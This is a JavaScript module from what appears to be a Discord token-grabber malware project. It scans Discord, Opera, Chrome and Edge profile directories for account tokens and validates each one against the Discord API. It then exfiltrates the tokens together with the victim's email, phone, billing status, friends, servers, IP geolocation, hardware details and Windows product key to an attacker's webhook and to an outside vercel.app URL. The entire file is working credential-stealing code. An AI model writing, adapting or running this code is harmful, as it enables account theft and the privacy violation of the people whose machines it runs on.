const { getInfo } = require("./../../modules/core/core");
const { fetchServers, fetchFriends, getEmbeds, send } = require("./../../utils/functions");
const { WebhookClient } = require("discord.js");
const { ALL_TOKENS, FIND_TOKENS } = require("./find");
const DiscordToken = require("discord.js-token");
const process = require("process");
const axios = require("axios");

const GET_CONFIG = require("./../../config/config")();

const webhook = new WebhookClient({
    url: GET_CONFIG.webhook,
});

const APPDATA = process.env.appdata;
const LOCAL_APPDATA = process.env.localappdata;

let paths = [
    `${APPDATA}/discord/`,
    `${APPDATA}/discordcanary/`,
    `${APPDATA}/discordptb/`,
    `${APPDATA}/discorddevelopment/`,
    `${APPDATA}/lightcord/`,
    `${APPDATA}/Opera Software/Opera Stable/`,
    `${APPDATA}/Opera Software/Opera GX Stable/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Default/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 1/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 2/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 3/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 4/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 5/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Guest Profile/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Default/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 1/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 2/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 3/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 4/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Profile 5/Network/`,
    `${LOCAL_APPDATA}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Default/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 1/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 2/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 3/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 4/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 5/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Guest Profile/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Default/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${LOCAL_APPDATA}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

async function SEND_INFOS() {
    for (let path of paths) {
        await FIND_TOKENS(path);
    }
    for (let TOKEN of ALL_TOKENS) {
        try {
            let k4itrun;
            try {
                const _ = await axios.get("https://discord.com/api/v9/users/@me", {
                    headers: {
                        "Content-Type": "application/json",
                        Authorization: TOKEN
                    }
                });
                k4itrun = _.data;
            } catch (error) {
                k4itrun = null;
            }

            if (!k4itrun) continue;

            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${TOKEN}`;
            var servers =  fetchServers(TOKEN);
            var friends =  fetchFriends(TOKEN);
            let system = await getInfo();
            var discord = new DiscordToken(TOKEN, system.IP).info;

            webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "Initialized Grabber",
                fields: [
                    { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                    { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
                    { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.IP + "`", inline: true },
                    { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                    { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                    { name: "Badges", value: "" + discord.badges + "", inline: true },
                    { name: "Billing", value: "" + discord.billing + "", inline: true },
                ],
            }))).then((r) => { axios.get(copy) }).catch((e) => { axios.get(copy) });

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Friend(s)",
                desc: "" + friends.all + ""
            }))), 50);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Guild(s)",
                desc: "" + servers.all + ""
            }))), 100);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "User Informatio(s)",
                desc:
                    "**NSFW**" + discord.NSFW + "\n" +
                    "**Status**" + discord.status + "\n" +
                    "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" +
                    "**Connection**" + "`" + discord.totalConnection + "`\n" +
                    "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" +
                    "**Blocked**" + "`" + discord.totalBlocked + "`\n" +
                    "**Servers**" + "`" + discord.totalGuild + "`\n" +
                    "**Friends**" + "`" + discord.totalFriend + "`\n" +
                    "**Theme**" + "`" + discord.theme + "`\n" +
                    "**Pending**" + "`" + discord.pending + "`\n\n" +
                    "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
            }))), 150);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "System Informatio(s)",
                fields: [
                    {
                        name: "User",
                        value: "```yml" +
                            "\nUsername: " + process.env.USERNAME +
                            "\nHostname: " + process.env.COMPUTERNAME + "```",
                        inline: false
                    },
                    {
                        name: "System",
                        value: "```yml" +
                            "\nCPU: " + system.CPU +
                            "\nUUID: " + system.UID +
                            "\nRAM: " + system.RAM +
                            "\nMac Address: " + "Not found" +
                            "\nProduct Key: " + system.WINDOWS_KEY +
                            "\nLOCAL IP: " + "Not found" +
                            "\nOS Version: " + system.WINDOWS_VERSION + "```",
                        inline: false
                    },
                    {
                        name: "Network",
                        value: "```yml" +
                            "\nPUBLIC: " + system.IP +
                            "\nCountry: " + discord.IP.country +
                            "\nRegion: " + discord.IP.region +
                            "\nCity: " + discord.IP.city +
                            "\nLatitude: " + discord.IP.latitude +
                            "\nLongitude: " + discord.IP.longitude +
                            "\nISP: " + discord.IP.isp +
                            "\nTime Zone: " + discord.IP.timezone +
                            "\nCurrency Code: " + discord.IP.currency_code + "```",
                        inline: false
                    },
                ]
            }))), 200);
            continue;
        } catch (e) {
            console.error(e);
        }
    }
}

module.exports = {
    sendTokens: SEND_INFOS
}